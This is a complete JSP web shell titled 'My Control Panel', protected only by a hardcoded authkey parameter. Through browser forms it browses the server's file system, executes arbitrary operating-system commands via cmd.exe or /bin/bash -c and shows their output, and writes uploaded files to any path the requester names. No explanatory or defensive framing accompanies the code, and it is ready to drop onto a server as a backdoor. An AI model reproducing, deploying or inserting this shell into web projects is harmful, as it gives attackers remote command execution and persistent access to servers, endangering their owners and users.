<%@page import="java.util.Map.Entry"%>
<jsp:useBean id="prop" scope="page" class="java.util.Properties" />
<%@ page import="java.util.*,java.io.*,javax.servlet.*"%>

<%
    if(request.getParameter("authkey") == null || !"Passshgkshshh@3425425".equals(request.getParameter("authkey"))){
        throw new Exception("Error");
    }
%>

<%!

public static String escapeHTML(String s) {
    StringBuilder out = new StringBuilder(Math.max(16, s.length()));
    for (int i = 0; i < s.length(); i++) {
        char c = s.charAt(i);
        if (c > 127 || c == '"' || c == '<' || c == '>' || c == '&') {
            out.append("&#");
            out.append((int) c);
            out.append(';');
        } else {
            out.append(c);
        }
    }
    return out.toString();
}

private final static char[] hexArray = "0123456789ABCDEF".toCharArray();
public static String bytesToHex(byte[] bytes) {
    char[] hexChars = new char[bytes.length * 2];
    for ( int j = 0; j < bytes.length; j++ ) {
        int v = bytes[j] & 0xFF;
        hexChars[j * 2] = hexArray[v >>> 4];
        hexChars[j * 2 + 1] = hexArray[v & 0x0F];
    }
    return new String(hexChars);
}

private class MultiPartFormData {

	private Hashtable parameters = new Hashtable();
	private byte[] fileBytes, bytes;
	private final int mbLimit = 7;
	private final int FILE_SIZE_LIMIT = 1024*1024*mbLimit;
	private String data;

	public MultiPartFormData(HttpServletRequest request) throws IOException {
		
		int contentLength = request.getContentLength();
	
		if(contentLength > FILE_SIZE_LIMIT)
			throw new IOException("File has exceeded size limit.");
		
		ServletInputStream in = request.getInputStream();
		
		bytes = new byte[contentLength];
		byte[] tempByte = new byte[1];
		int paramCount = 0;
		int paramLineCount = 0;	
		int byteCount = 0;
		
		while(in.read(tempByte) > -1) {
			bytes[byteCount] = tempByte[0];
			byteCount++;
		}

		String data = new String(bytes, "ISO-8859-1");
		this.data = data;
		String boundary = data.substring(0,data.indexOf('\n'));
		String[] elements = data.split(boundary);

		for(int i = 0; i < elements.length; i++) {
			

			if(elements[i].length() > 0) {
				

				String[] descval = elements[i].split("\n");
				
				
				// take the first line of this element and split it by ";"
				String[] disp = descval[1].split(";");

				// if there's a filename, it's a file				
				if(disp.length > 2) {

						String longFileName = disp[2].substring(
							disp[2].indexOf('"')+1,disp[2].length()-2).trim();
						parameters.put("longFileName",longFileName);
						parameters.put("fileName",longFileName.substring(
							longFileName.lastIndexOf("\\")+1,
							longFileName.length()));
						parameters.put("contentType",descval[2].substring(
							descval[2].indexOf(' ')+1,
							descval[2].length()-1));
	
						int pos = 0;
						int lineCount = 0;
	
						while(lineCount != paramLineCount) {
							if((char)bytes[pos] == '\n') lineCount++;
							pos++;
						}
						// 0d0a0d0a  -> 0d0a
						int start = elements[i].indexOf("\r\n\r\n") + 4;
						int end = elements[i].length() - 2; // remove 2 byte 0d0a
						String fileData = elements[i].substring(start, end);
						//System.out.println(bytesToHex(fileData.getBytes()));
						fileBytes = fileData.getBytes("ISO-8859-1");	
						parameters.put("contentLength",""+fileBytes.length);
	
				} else {
					
					paramCount++;
					paramLineCount += 4;
					
					// loop for multi-line params
					String value = "";
					for(int p = 3; p < descval.length; p++) {
						
						if(p != 3) value += "\n";
						value += descval[p].trim();
						paramLineCount++;
					}
					
					parameters.put(
						descval[1].substring(
							descval[1].indexOf('"')+1,
							descval[1].length()-2).trim(),
						value
					);
				}
			}
		}
		
		bytes = null;
		System.gc();
	}

	public byte[] getFile() { return fileBytes; }
	public Hashtable getParameters() { return parameters; }
}
%>

<%

String upload_result = "";

// Get and set current directory
String current_directory = System.getProperty("user.dir");
if(request.getParameter("current_directory") != null){
	current_directory = request.getParameter("current_directory");
	File directory = new File(current_directory).getAbsoluteFile();
    if (directory.exists())
    {
        System.setProperty("user.dir", directory.getAbsolutePath());
    }
}

// handle module
String mod = request.getParameter("mod");
StringBuffer output_cmd = new StringBuffer();
String current_command = "";
// change directory
if(mod != null && "browser".equalsIgnoreCase(mod)){
	String directory = request.getParameter("directory");
	if(directory != null){
		File directoryFile = null;
		if(directory.equals("..")){
			File current_directory_file = new File(current_directory);
			directoryFile = current_directory_file.getParentFile();
			current_directory = directoryFile.getAbsolutePath();
		} else if(new File(directory).isAbsolute()) {
			directoryFile = new File(directory);
			current_directory = directory;
			//System.out.println("Absolute:" + current_directory);
		} else {
			current_directory = current_directory + File.separator + directory;
			directoryFile = new File(current_directory).getAbsoluteFile();
		}
	    if (directoryFile.exists())
	    {
	        System.setProperty("user.dir", directoryFile.getAbsolutePath());
	    }
	}
}else if(mod != null && "cmd".equalsIgnoreCase(mod)){ //run function 
        if (request.getParameter("c") != null) {
                Process p = null;
                current_command = request.getParameter("c");
                //System.out.println("[+] current_command: " + current_command);
                if(System.getProperty("os.name").toLowerCase().indexOf("win") != -1){ // for window
                        String command = "cmd.exe /c " + request.getParameter("c"); 
                        p = Runtime.getRuntime().exec(command);
                } else {
                        String[] command = new String[]{"/bin/bash", "-c", request.getParameter("c")};
                        p = Runtime.getRuntime().exec(command);
                }
                InputStream os = p.getInputStream();
                BufferedReader outReader = new BufferedReader(new InputStreamReader(os));
                String line = "";
                while((line = outReader.readLine()) != null){
                	output_cmd.append(line + "\n");
                }
                InputStream es = p.getErrorStream();
                BufferedReader errReader = new BufferedReader(new InputStreamReader(es));
                while((line = errReader.readLine()) != null){
                	output_cmd.append(line + "\n");
                }
                //System.out.println(output_cmd.toString());  
        }        
} else if(request.getContentType() != null && request.getContentType().indexOf("multipart/form-data") != -1){  // upload
	//System.out.println("[+] Upload");
	MultiPartFormData formdata = new MultiPartFormData(request);
	Hashtable table = formdata.getParameters();
	String path = (String)table.get("path");
	String fileName = (String)table.get("fileName");
	String contentLength = (String)table.get("contentLength");
	//System.out.println("ContentLength:" + contentLength);
	current_directory = (String)table.get("current_directory");
	String fullPath = ""; 
	if(path != null && !"".equals(path)){
		fullPath = path + File.separator+ fileName;
	} else {
		fullPath = current_directory + File.separator + fileName;
	}
	File file = new File(fullPath);
	FileOutputStream outStream = new FileOutputStream(file);
	outStream.write(formdata.getFile());
	outStream.close();
	upload_result = "Upload file " + fileName + " successfully to " + fullPath + ", contentLength: " + contentLength;
	
    
}
%>
<html>
<head>
<title>My Control Panel</title>
</head>
<body>
<h1>My Control Panel</h1>
<div>
	<h3>File system browser</h3>
	<% if(System.getProperty("os.name").toLowerCase().indexOf("win") != -1){ %>
			<h2>List Drives: 
			<%
			File[] paths;
			javax.swing.filechooser.FileSystemView fsv = javax.swing.filechooser.FileSystemView.getFileSystemView();
			// returns pathnames for files and directory
			paths = File.listRoots();
			// for each pathname in pathname array
			for(File path: paths)
			{
			%>
				<form id=browserdriveform name=browserform method=post action='' style="display: inline">
						<input type=hidden  name=mod value="browser" >
						<input type=hidden  name=current_directory value="<%=escapeHTML(current_directory)%>" >
						<input type=hidden  name=directory value="<%=path%>" >
						<a href=# onclick="this.parentElement.submit();" style="size: 200%" ><%=path%></a>
				</form>&nbsp;&nbsp;&nbsp;&nbsp;
			<%
			}
			%>
			</h2>
	<% } %>
	<h2>Current Directory: <%= escapeHTML(current_directory) %></h2>
	<ul>
		<li><form id=browserparentform name=browserform method=post action='' style="display: inline">
				<input type=hidden  name=mod value="browser" >
				<input type=hidden  name=current_directory value="<%=escapeHTML(current_directory)%>" >
				<input type=hidden  name=directory value=".." >
				<a href=# onclick="this.parentElement.submit();" style="font-size: 150%" >..</a>
			</form>
	<% 
		// get list all file and directory of current directory
		File directory = new File(current_directory);
		//get all the files from a directory
		File[] fList = directory.listFiles();
		for (File file : fList){
	%>
			<li>
			<% if(file.isDirectory()){ %>
			<form id=browserform name=browserform method=post action='' style="display: inline">
				<input type=hidden  name=mod value="browser" >
				<input type=hidden  name=current_directory value="<%=escapeHTML(current_directory)%>" >
				<input type=hidden  name=directory value="<%=escapeHTML(file.getName()) %>" >
				<a href=# onclick="this.parentElement.submit();" ><%=escapeHTML(file.getName()) %></a>
			</form>
			<% } else { %>
				    <%=file.getName() %>
			<% } %>
			 -    <%=file.length()+"B" %>
			 </li>
	<%  
		} 
	%>
	</ul>
</div>
<div>
	<h3>Command</h3>
	<form method=post id=runform name=runform action=''>
		<input type=hidden name=mod value="cmd" >
		<input type=hidden name=current_directory value="<%=escapeHTML(current_directory)%>" >
		<input type=text name=c size="100" value="<%=escapeHTML(current_command)%>">
		<input type=submit value=Run>
	</form>
	<h4>Command Result:</h4>
	<pre style="border: 1px solid; padding: 2px; margin: 0px !important;">
	<%= escapeHTML(output_cmd.toString()) %>
	</pre>
</div>
<div>
	<h3>Upload File</h3>
	<form method=post id=uploadform name=uploadform action='' enctype='multipart/form-data'>
	<input type=hidden name=mod value="upload" >
	<input type=hidden name=current_directory value="<%=escapeHTML(current_directory)%>" >
	<input type=text name=path>
	<input type=file name=file>
	<input type=submit value=Upload>
	</form>
	<%=upload_result%>
</div>
</body>
</html>
